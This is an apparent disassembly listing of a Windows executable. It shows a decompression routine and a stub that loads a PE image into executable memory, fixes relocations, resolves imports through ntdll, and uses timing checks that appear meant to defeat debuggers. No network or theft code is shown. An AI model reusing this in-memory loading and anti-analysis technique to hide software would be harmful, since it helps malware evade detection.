		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		mov	ecx, [esp+38h+var_10]
		dec	edx
		add	esi, 8
		add	ebx, eax
		movzx	eax, ch
		mov	[esp+38h+var_14], eax
		movzx	ecx, cl
		add	ecx, eax
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [esp+38h+var_14]
		inc	ebp
		mov	[esp+38h+var_28], edx
		dec	eax
		and	eax, ebx
		shr	eax, cl
		movzx	ecx, word ptr [esp+38h+var_10+2]
		add	eax, ecx
		mov	ecx, [edi+50h]
		mov	eax, [ecx+eax*4]
		mov	[esp+38h+var_20], eax
		shr	eax, 8
		movzx	eax, al
		add	eax, [esp+38h+var_14]
		cmp	eax, esi
		ja	short loc_4038C7

loc_403921:				; CODE XREF: sub_402E20+AA5j
		movzx	ecx, byte ptr [esp+38h+var_10+1]
		mov	eax, [esp+38h+var_20]
		shr	ebx, cl
		sub	esi, ecx

loc_40392E:				; CODE XREF: sub_402E20+A50j
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		shr	ebx, cl
		sub	esi, ecx
		mov	[esp+38h+var_14], ecx
		test	al, 40h
		jz	short loc_403952
		mov	eax, [esp+38h+arg_0]
		mov	dword ptr [eax+18h], offset aInvalidDista_1 ; "invalid distance	code"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_403952:				; CODE XREF: sub_402E20+B20j
		mov	ecx, eax
		movzx	eax, al
		shr	ecx, 10h
		and	eax, 0Fh
		mov	[edi+44h], ecx
		mov	[edi+48h], eax
		mov	dword ptr [edi], 15h

loc_403969:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	eax, [edi+48h]	; jumptable 00402EA4 case 21
		test	eax, eax
		jz	short loc_4039A8
		cmp	esi, eax
		jnb	short loc_403994

loc_403974:				; CODE XREF: sub_402E20+B72j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, [edi+48h]
		jb	short loc_403974

loc_403994:				; CODE XREF: sub_402E20+B52j
		mov	ecx, [edi+48h]
		mov	eax, 1
		shl	eax, cl
		dec	eax
		and	eax, ebx
		add	[edi+44h], eax
		shr	ebx, cl
		sub	esi, ecx

loc_4039A8:				; CODE XREF: sub_402E20+B4Ej
		mov	ecx, [edi+2Ch]
		sub	ecx, [esp+38h+var_24]
		add	ecx, [esp+38h+var_18]
		cmp	[edi+44h], ecx
		jbe	short loc_4039C8
		mov	eax, [esp+38h+arg_0]
		mov	dword ptr [eax+18h], offset aInvalidDista_0 ; "invalid distance	too far	back"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_4039C8:				; CODE XREF: sub_402E20+B96j
		mov	dword ptr [edi], 16h

loc_4039CE:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		cmp	[esp+38h+var_24], 0 ; jumptable	00402EA4 case 22
		jz	loc_403BB7
		mov	ecx, [esp+38h+var_18]
		sub	ecx, [esp+38h+var_24]
		mov	eax, [edi+44h]
		cmp	eax, ecx
		jbe	short loc_403A24
		sub	eax, ecx
		mov	ecx, [edi+30h]
		mov	[esp+38h+var_20], eax
		cmp	eax, ecx
		jbe	short loc_403A05
		sub	eax, ecx
		mov	ecx, [edi+34h]
		add	ecx, [edi+28h]
		mov	[esp+38h+var_20], eax
		sub	ecx, eax
		jmp	short loc_403A11
; ---------------------------------------------------------------------------

loc_403A05:				; CODE XREF: sub_402E20+BD3j
		mov	ecx, [edi+34h]
		sub	ecx, eax
		add	ecx, [edi+30h]
		mov	eax, [esp+38h+var_20]

loc_403A11:				; CODE XREF: sub_402E20+BE3j
		mov	[esp+38h+var_10], ecx
		mov	ecx, [edi+40h]
		mov	[esp+38h+var_8], ecx
		cmp	eax, ecx
		jbe	short loc_403A39
		mov	eax, ecx
		jmp	short loc_403A35
; ---------------------------------------------------------------------------

loc_403A24:				; CODE XREF: sub_402E20+BC6j
		mov	ecx, [esp+38h+var_1C]
		sub	ecx, eax
		mov	eax, [edi+40h]
		mov	[esp+38h+var_10], ecx
		mov	[esp+38h+var_8], eax

loc_403A35:				; CODE XREF: sub_402E20+C02j
		mov	[esp+38h+var_20], eax

loc_403A39:				; CODE XREF: sub_402E20+BFEj
		mov	ecx, [esp+38h+var_24]
		cmp	eax, ecx
		jbe	short loc_403A47
		mov	eax, ecx
		mov	[esp+38h+var_20], eax

loc_403A47:				; CODE XREF: sub_402E20+C1Fj
		sub	ecx, eax
		mov	[esp+38h+var_24], ecx
		mov	ecx, [esp+38h+var_8]
		sub	ecx, eax
		mov	[edi+40h], ecx

loc_403A56:				; CODE XREF: sub_402E20+C55j
		mov	ecx, [esp+38h+var_10]
		mov	eax, [esp+38h+var_1C]
		mov	cl, [ecx]
		mov	[eax], cl
		mov	ecx, 1
		add	[esp+38h+var_10], ecx
		add	eax, ecx
		sub	[esp+38h+var_20], ecx
		mov	[esp+38h+var_1C], eax
		jnz	short loc_403A56
		cmp	dword ptr [edi+40h], 0
		jnz	loc_403B59
		mov	dword ptr [edi], 12h
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_403A8C:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		test	ecx, ecx	; jumptable 00402EA4 case 23
		jz	loc_403BB7
		mov	eax, [esp+38h+var_1C]
		mov	cl, [edi+40h]
		mov	[eax], cl
		inc	eax
		dec	[esp+38h+var_24]
		mov	[esp+38h+var_1C], eax
		mov	dword ptr [edi], 12h
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_403AB1:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		cmp	dword ptr [edi+8], 0 ; jumptable 00402EA4 case 24
		jz	loc_403B9F
		cmp	esi, 20h
		jnb	short loc_403AE0

loc_403AC0:				; CODE XREF: sub_402E20+CBEj
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, 20h
		jb	short loc_403AC0

loc_403AE0:				; CODE XREF: sub_402E20+C9Ej
		mov	eax, [esp+38h+var_18]
		sub	eax, [esp+38h+var_24]
		mov	ecx, [esp+38h+arg_0]
		add	[ecx+14h], eax
		add	[edi+1Ch], eax
		mov	[esp+38h+var_18], eax
		test	eax, eax
		jz	short loc_403B16
		mov	edx, [esp+38h+var_1C]
		mov	ecx, [edi+18h]
		sub	edx, eax
		call	sub_402A30
		mov	ecx, [esp+38h+arg_0]
		mov	edx, [esp+38h+var_28]
		mov	[edi+18h], eax
		mov	[ecx+30h], eax

loc_403B16:				; CODE XREF: sub_402E20+CD8j
		mov	eax, [esp+38h+var_24]
		mov	[esp+38h+var_18], eax
		mov	ecx, ebx
		and	ecx, 0FF00h
		mov	eax, ebx
		shl	eax, 10h
		add	ecx, eax
		mov	eax, ebx
		shr	eax, 8
		and	eax, 0FF00h
		shl	ecx, 8
		add	ecx, eax
		mov	eax, ebx
		shr	eax, 18h
		add	ecx, eax
		cmp	ecx, [edi+18h]
		jz	short loc_403B9B
		mov	ecx, [esp+38h+arg_0]
		mov	dword ptr [ecx+18h], offset aIncorrectDataC ; "incorrect data check"

loc_403B53:				; CODE XREF: sub_402E20+EAj
					; sub_402E20+106j ...
		mov	dword ptr [edi], 1Bh

loc_403B59:				; CODE XREF: sub_402E20+97j
					; sub_402E20+166j ...
		mov	eax, [edi]
		cmp	eax, 1Ch
		jbe	loc_402EA0
		pop	esi
		pop	ebx
		pop	edi
		mov	eax, 0FFFFFFFEh
		pop	ebp
		add	esp, 28h
		retn
; ---------------------------------------------------------------------------

loc_403B71:				; CODE XREF: sub_402E20+1CCj
		mov	eax, [esp+38h+arg_0]
		mov	ecx, [esp+38h+var_1C]
		mov	[edi+3Ch], esi
		pop	esi
		mov	[edi+38h], ebx
		mov	[eax+0Ch], ecx
		mov	ecx, [esp+34h+var_24]
		pop	ebx
		mov	[eax], ebp
		pop	edi
		mov	[eax+10h], ecx
		mov	[eax+4], edx
		mov	eax, 2
		pop	ebp
		add	esp, 28h
		retn
; ---------------------------------------------------------------------------

loc_403B9B:				; CODE XREF: sub_402E20+D26j
		xor	ebx, ebx
		xor	esi, esi

loc_403B9F:				; CODE XREF: sub_402E20+C95j
		mov	dword ptr [edi], 1Ah

loc_403BA5:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	[esp+38h+var_C], 1 ; jumptable 00402EA4	case 26
		jmp	short loc_403BB7
; ---------------------------------------------------------------------------

loc_403BAF:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	[esp+38h+var_C], 0FFFFFFFDh ; jumptable	00402EA4 case 27

loc_403BB7:				; CODE XREF: sub_402E20+A3j
					; sub_402E20+172j ...
		cmp	dword ptr [edi+28h], 0
		mov	eax, [esp+38h+arg_0]
		mov	ecx, [esp+38h+var_1C]
		mov	[eax+0Ch], ecx
		mov	ecx, [esp+38h+var_24]
		mov	[eax+10h], ecx
		mov	[eax], ebp
		mov	[eax+4], edx
		mov	[edi+38h], ebx
		mov	[edi+3Ch], esi
		jnz	short loc_403BE7
		cmp	dword ptr [edi], 18h
		jge	short loc_403C0B
		mov	edx, ecx
		cmp	[esp+38h+var_18], edx
		jz	short loc_403C0B

loc_403BE7:				; CODE XREF: sub_402E20+DB8j
		push	eax
		mov	eax, [esp+3Ch+var_18]
		call	sub_402C90
		add	esp, 4
		test	eax, eax
		jz	short loc_403C0B
		mov	dword ptr [edi], 1Ch

loc_403BFE:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		pop	esi		; jumptable 00402EA4 case 28
		pop	ebx
		pop	edi
		mov	eax, 0FFFFFFFCh
		pop	ebp
		add	esp, 28h
		retn
; ---------------------------------------------------------------------------

loc_403C0B:				; CODE XREF: sub_402E20+DBDj
					; sub_402E20+DC5j ...
		mov	esi, [esp+38h+arg_0]
		mov	ecx, [esp+38h+var_4]
		mov	eax, [esp+38h+var_18]
		sub	eax, [esi+10h]
		sub	ecx, [esi+4]
		add	[esi+14h], eax
		add	[esi+8], ecx
		add	[edi+1Ch], eax
		cmp	dword ptr [edi+8], 0
		jz	short loc_403C43
		test	eax, eax
		jz	short loc_403C43
		mov	edx, [esi+0Ch]
		mov	ecx, [edi+18h]
		sub	edx, eax
		call	sub_402A30
		mov	[edi+18h], eax
		mov	[esi+30h], eax

loc_403C43:				; CODE XREF: sub_402E20+E0Aj
					; sub_402E20+E0Ej
		mov	ecx, [edi+4]
		mov	eax, [esp+38h+var_C]
		neg	ecx
		sbb	ecx, ecx
		and	ecx, 40h
		xor	edx, edx
		cmp	dword ptr [edi], 0Bh
		setnz	dl
		dec	edx
		and	edx, 80h
		add	ecx, edx
		add	ecx, [edi+3Ch]
		mov	[esi+2Ch], ecx
		test	eax, eax
		jnz	loc_402E97
		pop	esi
		pop	ebx
		pop	edi
		mov	eax, 0FFFFFFFBh
		pop	ebp
		add	esp, 28h
		retn
; ---------------------------------------------------------------------------

loc_403C7D:				; CODE XREF: sub_402E20+Bj
					; sub_402E20+16j ...
		pop	edi
		mov	eax, 0FFFFFFFEh
		pop	ebp
		add	esp, 28h
		retn
sub_402E20	endp

; ---------------------------------------------------------------------------
off_403C88	dd offset loc_402EAB	; DATA XREF: sub_402E20:loc_402EA4r
		dd offset loc_402E92	; jump table for switch	statement
		dd offset loc_402E92
		dd offset loc_402E92
		dd offset loc_402E92
		dd offset loc_402E92
		dd offset loc_402E92
		dd offset loc_402E92
		dd offset loc_402E92
		dd offset loc_402F8B
		dd offset loc_402FE8
		dd offset loc_403011
		dd offset loc_403011
		dd offset loc_4030C2
		dd offset loc_40311F
		dd offset loc_40317B
		dd offset loc_4031F1
		dd offset loc_4032E3
		dd offset loc_4035D4
		dd offset loc_4037C0
		dd offset loc_40380A
		dd offset loc_403969
		dd offset loc_4039CE
		dd offset loc_403A8C
		dd offset loc_403AB1
		dd offset loc_402E92
		dd offset loc_403BA5
		dd offset loc_403BAF
		dd offset loc_403BFE
off_403CFC	dd offset loc_40306C	; DATA XREF: sub_402E20+245r
		dd offset loc_40307D	; jump table for switch	statement
		dd offset loc_403095
		dd offset loc_4030A6
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_403D10	proc near		; CODE XREF: .text:00403D80j
					; start+440p

; FUNCTION CHUNK AT 00402DC0 SIZE 00000059 BYTES

		test	esi, esi
		jnz	short loc_403D18
		lea	eax, [esi-2]
		retn
; ---------------------------------------------------------------------------

loc_403D18:				; CODE XREF: sub_403D10+2j
		cmp	dword ptr [esi+20h], 0
		mov	dword ptr [esi+18h], 0
		jnz	short loc_403D33
		mov	dword ptr [esi+20h], offset loc_4025B0
		mov	dword ptr [esi+28h], 0

loc_403D33:				; CODE XREF: sub_403D10+13j
		cmp	dword ptr [esi+24h], 0
		jnz	short loc_403D40
		mov	dword ptr [esi+24h], offset loc_402590

loc_403D40:				; CODE XREF: sub_403D10+27j
		mov	eax, [esi+28h]
		mov	ecx, [esi+20h]
		push	2530h
		push	1
		push	eax
		call	ecx
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_403D5D
		mov	eax, 0FFFFFFFCh
		retn
; ---------------------------------------------------------------------------

loc_403D5D:				; CODE XREF: sub_403D10+45j
		mov	[esi+1Ch], eax
		mov	dword ptr [eax+8], 2
		mov	dword ptr [eax+24h], 0Fh
		mov	dword ptr [eax+34h], 0
		mov	edx, esi
		jmp	loc_402DC0
sub_403D10	endp

; ---------------------------------------------------------------------------
		align 10h
		jmp	sub_403D10

; =============== S U B	R O U T	I N E =======================================


sub_403D85	proc near		; CODE XREF: start+Fp
		push	offset ProcName	; "LdrGetProcedureAddress"
		push	offset ModuleName ; "ntdll"
		call	ds:GetModuleHandleA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	dword_405000, eax
		retn
sub_403D85	endp

; ---------------------------------------------------------------------------
		imul	eax, 8088405h
		inc	eax
		retn
; ---------------------------------------------------------------------------
		mov	ecx, [eax]
		imul	ecx, 343FDh
		add	ecx, 269EC3h
		mov	[eax], ecx
		mov	al, [eax+2]
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403DBE	proc near		; CODE XREF: start+232p
		push	0		; nSize
		push	offset Filename	; "			     "
		push	0		; hModule
		call	ds:GetModuleFileNameW
		neg	eax
		sbb	eax, eax
		neg	eax
		retn
sub_403DBE	endp

; ---------------------------------------------------------------------------
		and	eax, 11h
		sub	eax, 111h
		neg	eax
		sbb	eax, eax
		inc	eax
		retn
; ---------------------------------------------------------------------------
		xor	eax, eax
		inc	eax
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403DE6	proc near		; CODE XREF: sub_403E41+Bp

arg_0		= dword	ptr  4

		call	ds:GetTickCount
		and	eax, [esp+arg_0]
		jnz	short locret_403DF3
		inc	eax

locret_403DF3:				; CODE XREF: sub_403DE6+Aj
		retn
sub_403DE6	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403DF4	proc near		; CODE XREF: .text:00403E65p
					; start+27Dp ...

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	ecx, [edi+3Ch]
		add	ecx, edi
		movzx	edx, word ptr [ecx+14h]
		push	ebx
		movzx	ebx, word ptr [ecx+6]
		xor	eax, eax
		lea	edx, [edx+ecx+18h]
		mov	[ebp+var_4], eax
		cmp	ebx, eax
		jbe	short loc_403E3C
		add	edx, 14h
		push	esi

loc_403E17:				; CODE XREF: sub_403DF4+45j
		mov	esi, [edx-4]
		test	esi, esi
		jz	short loc_403E30
		mov	ecx, [edx]
		lea	eax, [esi+ecx]
		and	ecx, 11h
		add	eax, edi
		cmp	ecx, 111h
		jz	short loc_403E3B

loc_403E30:				; CODE XREF: sub_403DF4+28j
		add	edx, 28h
		inc	[ebp+var_4]
		cmp	[ebp+var_4], ebx
		jb	short loc_403E17

loc_403E3B:				; CODE XREF: sub_403DF4+3Aj
		pop	esi

loc_403E3C:				; CODE XREF: sub_403DF4+1Dj
		sub	eax, edi
		pop	ebx
		leave
		retn
sub_403DF4	endp


; =============== S U B	R O U T	I N E =======================================


sub_403E41	proc near		; CODE XREF: sub_403E6E:loc_403EEAp
					; sub_403F08+101p ...
		mov	eax, large fs:18h
		push	esi
		mov	esi, [eax+34h]
		push	esi
		call	sub_403DE6
		pop	ecx
		test	eax, eax
		jz	short loc_403E5E
		call	ds:GetTickCount
		mov	esi, eax

loc_403E5E:				; CODE XREF: sub_403E41+13j
		mov	eax, esi
		pop	esi
		retn
sub_403E41	endp

; ---------------------------------------------------------------------------
		push	edi
		mov	edi, eax
		call	sub_403DF4
		add	eax, edi
		pop	edi
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403E6E	proc near		; CODE XREF: start+51Bp

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  4

		push	ecx
		push	ecx
		push	ebp
		mov	ebp, [esp+0Ch+arg_0]
		mov	eax, [ebp+3Ch]
		xor	ecx, ecx
		add	eax, ebp
		mov	[esp+0Ch+var_8], ecx
		cmp	[eax+7Ch], ecx
		jz	short loc_403EEA
		push	ebx
		push	esi
		mov	esi, [eax+78h]
		add	esi, ebp
		mov	ebx, [esi+20h]
		push	edi
		mov	edi, [esi+1Ch]
		add	edi, ebp
		add	ebx, ebp
		mov	[esp+18h+arg_0], ecx
		cmp	[esi+14h], ecx
		jbe	short loc_403EE7

loc_403EA0:				; CODE XREF: sub_403E6E+5Ej
		mov	eax, [esp+18h+arg_0]
		mov	ecx, [ebx+eax*4]
		add	ecx, ebp
		mov	[esp+18h+var_4], ecx
		call	sub_4049CA
		mov	ecx, [esp+18h+var_4]
		mov	edx, eax
		call	sub_4049D8
		test	eax, eax
		jz	short loc_403ED0
		inc	[esp+18h+arg_0]
		mov	eax, [esp+18h+arg_0]
		cmp	eax, [esi+14h]
		jb	short loc_403EA0
		jmp	short loc_403EE7
; ---------------------------------------------------------------------------

loc_403ED0:				; CODE XREF: sub_403E6E+51j
		mov	eax, [esi+24h]
		mov	ecx, [esp+18h+arg_0]
		lea	eax, [eax+ecx*2]
		movzx	eax, word ptr [eax+ebp]
		mov	edi, [edi+eax*4]
		add	edi, ebp
		mov	[esp+18h+var_8], edi

loc_403EE7:				; CODE XREF: sub_403E6E+30j
					; sub_403E6E+60j
		pop	edi
		pop	esi
		pop	ebx

loc_403EEA:				; CODE XREF: sub_403E6E+15j
		call	sub_403E41
		sub	eax, dword_40500C
		mov	ecx, 7FFFh
		cmp	ecx, eax
		sbb	eax, eax
		not	eax
		and	eax, [esp+0Ch+var_8]
		pop	ebp
		pop	ecx
		pop	ecx
		retn
sub_403E6E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403F08	proc near		; CODE XREF: start+4F9p

var_43C		= byte ptr -43Ch
var_20		= word ptr -20h
var_1E		= word ptr -1Eh
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 440h
		and	[ebp+var_18], 0
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	esi
		mov	esi, [ebx+3Ch]
		add	esi, ebx
		cmp	dword ptr [esi], 4550h
		push	edi
		jz	short loc_403F55
		mov	ax, [ebx+0Ah]
		and	ax, 11h
		mov	ecx, 111h
		cmp	ax, cx
		jz	short loc_403F55
		mov	esi, offset dword_405010
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, esi
		call	sub_404990
		push	offset a0x0011	; "0x0011"
		jmp	loc_4041AF
; ---------------------------------------------------------------------------

loc_403F55:				; CODE XREF: sub_403F08+1Ej
					; sub_403F08+30j
		push	40h		; flProtect
		push	1000h		; flAllocationType
		push	dword ptr [esi+50h] ; dwSize
		push	0		; lpAddress
		call	ds:VirtualAlloc
		mov	edi, eax
		mov	[ebp+var_C], edi
		test	edi, edi
		jnz	short loc_403FB4
		call	ds:GetLastError
		mov	esi, eax
		push	offset a0x0012	; "0x0012: "
		lea	eax, [ebp+var_43C]
		call	sub_4049AC
		push	0Ah
		mov	eax, esi
		lea	ecx, [ebp+var_43C]
		call	sub_4048F0
		mov	esi, offset dword_405010
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, esi
		call	sub_404990
		lea	eax, [ebp+var_43C]
		push	eax
		jmp	loc_4041AF
; ---------------------------------------------------------------------------

loc_403FB4:				; CODE XREF: sub_403F08+66j
		mov	edx, [esi+54h]
		push	ebx
		call	sub_4049FC
		movzx	eax, word ptr [esi+14h]
		pop	ecx
		movzx	ecx, word ptr [esi+6]
		lea	eax, [eax+esi+18h]
		test	ecx, ecx
		jbe	short loc_404004
		lea	ebx, [eax+0Ch]
		lea	edi, [eax+14h]
		lea	esi, [eax+10h]
		mov	[ebp+var_8], ecx

loc_403FDA:				; CODE XREF: sub_403F08+F7j
		mov	eax, [edi]
		test	eax, eax
		jz	short loc_403FF3
		mov	ecx, [ebp+arg_0]
		mov	edx, [esi]
		add	eax, ecx
		push	eax
		mov	eax, [ebx]
		add	eax, [ebp+var_C]
		call	sub_4049FC
		pop	ecx

loc_403FF3:				; CODE XREF: sub_403F08+D6j
		add	esi, 28h
		add	edi, 28h
		add	ebx, 28h
		dec	[ebp+var_8]
		jnz	short loc_403FDA
		mov	edi, [ebp+var_C]

loc_404004:				; CODE XREF: sub_403F08+C4j
		mov	esi, [edi+3Ch]
		add	esi, edi
		call	sub_403E41
		sub	eax, dword_40500C
		cmp	eax, 7FFFh
		jbe	short loc_404022

loc_40401B:				; CODE XREF: sub_403F08+1DBj
		xor	eax, eax
		jmp	loc_4040B0
; ---------------------------------------------------------------------------

loc_404022:				; CODE XREF: sub_403F08+111j
		mov	ecx, [esi+0A4h]
		mov	[ebp+var_10], ecx
		test	ecx, ecx
		jz	short loc_404093
		mov	eax, [esi+0A0h]
		mov	ebx, edi
		sub	ebx, [esi+34h]
		add	eax, edi
		test	ecx, ecx
		jbe	short loc_404093

loc_404040:				; CODE XREF: sub_403F08+189j
		mov	edx, [eax+4]
		sub	edx, 8
		mov	[ebp+var_8], edx
		mov	edx, [eax]
		mov	[ebp+var_14], edx
		lea	edx, [eax+8]
		mov	[ebp+arg_0], edx
		jz	short loc_404088

loc_404056:				; CODE XREF: sub_403F08+17Bj
		mov	ecx, [ebp+arg_0]
		movzx	ecx, word ptr [ecx]
		mov	edx, ecx
		shr	edx, 0Ch
		test	edx, edx
		jz	short loc_404077
		cmp	edx, 3
		jnz	short loc_4040B5
		and	ecx, 0FFFh
		add	ecx, [ebp+var_14]
		add	ecx, edi
		add	[ecx], ebx

loc_404077:				; CODE XREF: sub_403F08+15Bj
		sub	[ebp+var_8], 2
		add	[ebp+arg_0], 2
		cmp	[ebp+var_8], 0
		ja	short loc_404056
		mov	ecx, [ebp+var_10]

loc_404088:				; CODE XREF: sub_403F08+14Cj
		sub	ecx, [eax+4]
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_10], ecx
		jnz	short loc_404040

loc_404093:				; CODE XREF: sub_403F08+125j
					; sub_403F08+136j
		cmp	dword ptr [esi+84h], 0
		jz	short loc_4040AA
		mov	ebx, [esi+80h]
		add	ebx, edi
		jnz	loc_404171

loc_4040AA:				; CODE XREF: sub_403F08+192j
					; sub_403F08+274j
		mov	[ebp+var_18], edi

loc_4040AD:				; CODE XREF: sub_403F08+2ACj
		mov	eax, [ebp+var_18]

loc_4040B0:				; CODE XREF: sub_403F08+115j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ---------------------------------------------------------------------------

loc_4040B5:				; CODE XREF: sub_403F08+160j
		mov	esi, offset dword_405010
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, esi
		call	sub_404990
		push	offset a0x0013	; "0x0013"
		jmp	loc_4041AF
; ---------------------------------------------------------------------------

loc_4040D0:				; CODE XREF: sub_403F08+26Ej
		lea	esi, [eax+edi]
		call	sub_403E41
		sub	eax, dword_40500C
		cmp	eax, 7FFFh
		ja	loc_40401B
		push	esi		; lpModuleName
		call	ds:GetModuleHandleA
		mov	[ebp+var_8], eax
		test	eax, eax
		jz	loc_404181
		mov	esi, [ebx]
		add	esi, edi
		mov	edi, [ebx+10h]
		add	edi, [ebp+var_C]
		jmp	short loc_404165
; ---------------------------------------------------------------------------

loc_404107:				; CODE XREF: sub_403F08+261j
		and	[ebp+var_10], 0
		and	[ebp+var_14], 0
		mov	ecx, 80000000h
		mov	edx, eax
		and	edx, ecx
		cmp	edx, ecx
		jz	short loc_40413D
		mov	ecx, [ebp+var_C]
		lea	eax, [eax+ecx+2]
		mov	ecx, eax
		mov	[ebp+var_1C], eax
		call	sub_4049CA
		mov	ecx, [ebp+var_14]
		mov	[ebp+var_20], ax
		mov	[ebp+var_1E], ax
		lea	eax, [ebp+var_20]
		jmp	short loc_404143
; ---------------------------------------------------------------------------

loc_40413D:				; CODE XREF: sub_403F08+212j
		movzx	ecx, word ptr [esi]
		mov	eax, [ebp+var_10]

loc_404143:				; CODE XREF: sub_403F08+233j
		and	[ebp+arg_0], 0
		lea	edx, [ebp+arg_0]
		push	edx
		push	ecx
		push	eax
		push	[ebp+var_8]
		call	dword_405000
		mov	eax, [ebp+arg_0]
		test	eax, eax
		jz	short loc_404199
		mov	[edi], eax
		add	esi, 4
		add	edi, 4

loc_404165:				; CODE XREF: sub_403F08+1FDj
		mov	eax, [esi]
		test	eax, eax
		jnz	short loc_404107
		mov	edi, [ebp+var_C]
		add	ebx, 14h

loc_404171:				; CODE XREF: sub_403F08+19Cj
		mov	eax, [ebx+0Ch]
		test	eax, eax
		jnz	loc_4040D0
		jmp	loc_4040AA
; ---------------------------------------------------------------------------

loc_404181:				; CODE XREF: sub_403F08+1EDj
		mov	esi, offset dword_405010
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, esi
		call	sub_404990
		push	offset a0x0014	; "0x0014"
		jmp	short loc_4041AF
; ---------------------------------------------------------------------------

loc_404199:				; CODE XREF: sub_403F08+253j
		mov	esi, offset dword_405010
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, esi
		call	sub_404990
		push	offset a0x0015	; "0x0015"

loc_4041AF:				; CODE XREF: sub_403F08+48j
					; sub_403F08+A7j ...
		call	sub_404956
		jmp	loc_4040AD
sub_403F08	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public start
start		proc near

var_CF4		= dword	ptr -0CF4h
var_CE4		= dword	ptr -0CE4h
hObject		= dword	ptr -0CE0h
lpBaseAddress	= dword	ptr -0CDCh
hFile		= dword	ptr -0CD8h
hFileMappingObject= dword ptr -0CD4h
var_CD0		= dword	ptr -0CD0h
dwSize		= dword	ptr -0CCCh
var_CC8		= dword	ptr -0CC8h
var_CC4		= dword	ptr -0CC4h
var_CC0		= dword	ptr -0CC0h
var_CBC		= dword	ptr -0CBCh
var_CB8		= dword	ptr -0CB8h
var_CB4		= dword	ptr -0CB4h
var_CB0		= dword	ptr -0CB0h
var_CA8		= dword	ptr -0CA8h
var_CA4		= dword	ptr -0CA4h
var_C94		= dword	ptr -0C94h
var_C90		= dword	ptr -0C90h
var_C8C		= dword	ptr -0C8Ch
FileInformation	= _BY_HANDLE_FILE_INFORMATION ptr -0C7Ch
var_C48		= word ptr -0C48h
var_834		= dword	ptr -834h
FileName	= word ptr -830h
var_41C		= dword	ptr -41Ch
Name		= word ptr -418h

		push	ebp
		mov	ebp, esp
		and	esp, 0FFFFFFF8h
		sub	esp, 0CE4h
		push	ebx
		push	esi
		push	edi
		call	sub_403D85
		mov	esi, ds:GetTickCount
		call	esi ; GetTickCount
		and	eax, 11h
		mov	ebx, offset dword_405010
		cmp	eax, 111h
		jz	loc_404606
		call	esi ; GetTickCount
		mov	dword_40500C, eax

loc_4041EF:				; CODE XREF: start+239j start+309j ...
		call	sub_403E41
		mov	ecx, eax
		sub	ecx, dword_40500C
		push	3
		xor	edx, edx
		mov	eax, ecx
		pop	esi
		div	esi
		test	ecx, 0FFFF8000h
		jnz	loc_4044B7
		xor	eax, eax
		xor	edi, edi
		mov	[esp+0CF0h+var_41C], edi
		mov	[esp+0CF0h+FileName], ax
		mov	[esp+0CF0h+var_834], edi
		mov	[esp+0CF0h+var_C48], ax
		call	sub_403E41
		mov	ecx, eax
		sub	ecx, dword_40500C
		xor	edx, edx
		mov	eax, ecx
		div	esi
		test	ecx, 0FFFF8000h
		jnz	loc_40439F
		push	offset a_xvm_mem_proce ; "_xvm_mem_process_info_0x"
		lea	eax, [esp+0CF4h+Name]
		call	sub_4049AC
		push	10h
		call	ds:GetCurrentProcessId
		lea	ecx, [esp+0CF4h+Name]
		call	sub_4048F0
		mov	esi, ds:OpenFileMappingW
		mov	eax, ecx
		push	eax		; lpName
		push	edi		; bInheritHandle
		push	4		; dwDesiredAccess
		mov	[esp+0CFCh+var_CC0], edi
		mov	[esp+0CFCh+var_CBC], edi
		call	esi ; OpenFileMappingW
		mov	[esp+0CF0h+hObject], eax
		call	ds:GetLastError
		mov	[esp+0CF0h+var_CE4], eax
		cmp	[esp+0CF0h+hObject], edi
		jz	loc_404351
